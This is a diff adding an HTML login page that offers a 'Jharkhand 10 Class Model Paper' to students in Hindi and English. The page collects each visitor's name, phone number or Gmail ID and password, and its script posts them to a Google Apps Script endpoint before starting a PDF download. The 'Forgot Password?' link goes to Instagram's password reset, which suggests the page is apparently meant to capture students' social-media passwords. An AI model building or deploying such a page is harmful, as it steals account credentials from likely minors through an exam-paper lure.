@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Jharkhand 10 Class Model Paper - Login</title>
+  <style>
+    :root{
+      --bg:#0f172a;
+      --card:#111827;
+      --muted:#94a3b8;
+      --text:#e5e7eb;
+      --accent:#22d3ee;
+      --accent-2:#a78bfa;
+      --ring:#38bdf8;
+      --error:#ef4444;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, "Noto Sans", Ubuntu, Cantarell, "Helvetica Neue", Arial;
+      background: radial-gradient(1000px 600px at 10% -10%, rgba(34,211,238,.15), transparent 60%),
+                  radial-gradient(900px 500px at 110% 10%, rgba(167,139,250,.12), transparent 60%),
+                  var(--bg);
+      color:var(--text);
+      min-height:100vh;
+      display:grid;
+      place-items:center;
+      padding:24px;
+    }
+    .wrap{width:100%; max-width:460px}
+    .title{text-align:center;line-height:1.25;margin-bottom:18px;}
+    .title h1{
+      margin:0 0 6px;
+      font-size:clamp(1.35rem, 1.1rem + 1.5vw, 2rem);
+      font-weight:800;
+      letter-spacing:.3px;
+      background:linear-gradient(90deg,var(--accent),var(--accent-2));
+      -webkit-background-clip:text;
+      background-clip:text;
+      color:transparent;
+      text-shadow:0 0 24px rgba(34,211,238,.25);
+    }
+    .title p{margin:0;color:var(--muted);font-size:.95rem;}
+    form{
+      background: linear-gradient(180deg, rgba(255,255,255,.02), rgba(255,255,255,.01)) , var(--card);
+      border:1px solid rgba(148,163,184,.15);
+      border-radius:18px;
+      padding:18px;
+      box-shadow:0 20px 40px rgba(2,6,23,.6), inset 0 1px 0 rgba(255,255,255,.06);
+    }
+    .field{margin-bottom:14px}
+    label{display:block;font-size:.9rem;margin-bottom:6px;color:#cbd5e1;}
+    input, select, button{
+      width:100%;padding:12px 13px;border-radius:12px;
+      border:1px solid rgba(148,163,184,.2);background:#0b1220;color:var(--text);
+      outline:none;transition:.18s ease;font-size:1rem;
+    }
+    input:focus, select:focus{border-color:var(--ring);box-shadow:0 0 0 4px rgba(56,189,248,.18);}
+    .row{display:grid;grid-template-columns: 1fr 1.2fr;gap:10px;align-items:end;}
+    .hint{font-size:.8rem;color:var(--muted);margin-top:6px;}
+    .error{color:var(--error);font-size:.82rem;margin-top:6px;display:none;}
+    button{background: linear-gradient(90deg, var(--accent), var(--accent-2));border:none;font-weight:700;letter-spacing:.2px;cursor:pointer;}
+    button:hover{filter:brightness(1.05)}
+    .fineprint{margin-top:10px;font-size:.78rem;color:var(--muted);text-align:center;}
+    .forgot{text-align:right;margin-top:10px;}
+    .forgot a{color:var(--accent);font-size:.85rem;text-decoration:none;}
+    .forgot a:hover{text-decoration:underline;}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="title">
+      <h1>Jharkhand 10 Class Model Paper</h1>
+      <p>Login karke model paper access karein</p>
+    </div>
+
+    <form id="loginForm" name="google-sheet" novalidate>
+      <!-- Name -->
+      <div class="field">
+        <label for="name">Name</label>
+        <input id="name" name="name" type="text" placeholder="Apna naam likhen" required />
+        <div class="error" id="err-name">Please enter your name.</div>
+      </div>
+
+      <!-- Selector + Unified Input -->
+      <div class="row">
+        <div class="field">
+          <label for="contactType">Contact Type</label>
+          <select id="contactType" name="contactType" aria-label="Contact Type">
+            <option value="phone" selected>Phone No</option>
+            <option value="email">Gmail ID</option>
+          </select>
+        </div>
+
+        <div class="field">
+          <label id="contactLabel" for="contact">Phone No</label>
+          <input id="contact" name="contact" type="tel" inputmode="numeric"
+                 placeholder="e.g. 9876543210"
+                 pattern="^[6-9]\d{9}$" aria-describedby="contactHint" required />
+          <div class="hint" id="contactHint">Phone: 10 digits starting 6–9 • Gmail: example@gmail.com</div>
+          <div class="error" id="err-contact">Please enter a valid phone number.</div>
+        </div>
+      </div>
+
+      <!-- Password -->
+      <div class="field">
+        <label for="password">Password</label>
+        <input id="password" name="password" type="password" placeholder="••••••••" minlength="6" required />
+        <div class="error" id="err-pass">Password must be at least 6 characters.</div>
+      </div>
+
+      <button type="submit">Submit</button>
+
+      <!-- Forgot Password Option -->
+      <div class="forgot">
+        <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">
+          Forgot Password?
+        </a>
+      </div>
+
+      <div class="fineprint">By continuing, you agree to our terms & privacy policy.</div>
+    </form>
+  </div>
+
+  <script>
+    (function () {
+      const scriptURL = "https://script.google.com/macros/s/AKfycbwVuX9zCn0yHKpC7VuVOoSEqwYeHJIA6R6gwTvVypOTsJ-NymJ9jbPiujSO9fAXYUh6sQ/exec"; // <-- apna Google Script URL
+      const form = document.forms["google-sheet"];
+
+      const contactType = document.getElementById('contactType');
+      const contact = document.getElementById('contact');
+      const contactLabel = document.getElementById('contactLabel');
+      const errContact = document.getElementById('err-contact');
+
+      function setForPhone(){
+        contact.type = 'tel';
+        contact.inputMode = 'numeric';
+        contact.placeholder = 'e.g. 9876543210';
+        contact.pattern = '^[6-9]\\d{9}$';
+        contactLabel.textContent = 'Phone No';
+        errContact.textContent = 'Please enter a valid phone number.';
+      }
+      function setForEmail(){
+        contact.type = 'email';
+        contact.inputMode = 'email';
+        contact.placeholder = 'example@gmail.com';
+        contact.removeAttribute('pattern');
+        contactLabel.textContent = 'Gmail ID';
+        errContact.textContent = 'Please enter a valid Gmail address.';
+      }
+
+      setForPhone();
+      contactType.addEventListener('change', () => {
+        if (contactType.value === 'phone') setForPhone(); else setForEmail();
+        contact.value = '';
+      });
+
+      const name = document.getElementById('name');
+      const pass = document.getElementById('password');
+      const errName = document.getElementById('err-name');
+      const errPass = document.getElementById('err-pass');
+
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        let ok = true;
+
+        if (!name.value.trim()) { errName.style.display = 'block'; ok = false; }
+        else errName.style.display = 'none';
+
+        if (!contact.checkValidity()) { errContact.style.display = 'block'; ok = false; }
+        else errContact.style.display = 'none';
+
+        if (!pass.value || pass.value.length < 6) { errPass.style.display = 'block'; ok = false; }
+        else errPass.style.display = 'none';
+
+        if (!ok) return;
+
+        try {
+          // ✅ Submit to Google Sheet
+          await fetch(scriptURL, { method: "POST", body: new FormData(form) });
+
+          // ✅ Trigger PDF Download
+          const pdfUrl = "jkb math modal paper 2025.pdf"; // <-- apna PDF file ka naam/URL yahan daalo
+          const link = document.createElement("a");
+          link.href = pdfUrl;
+          link.download = "model-paper.pdf";
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+        } catch (err) {
+          alert("❌ Error submitting form. Check console.");
+          console.error(err);
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
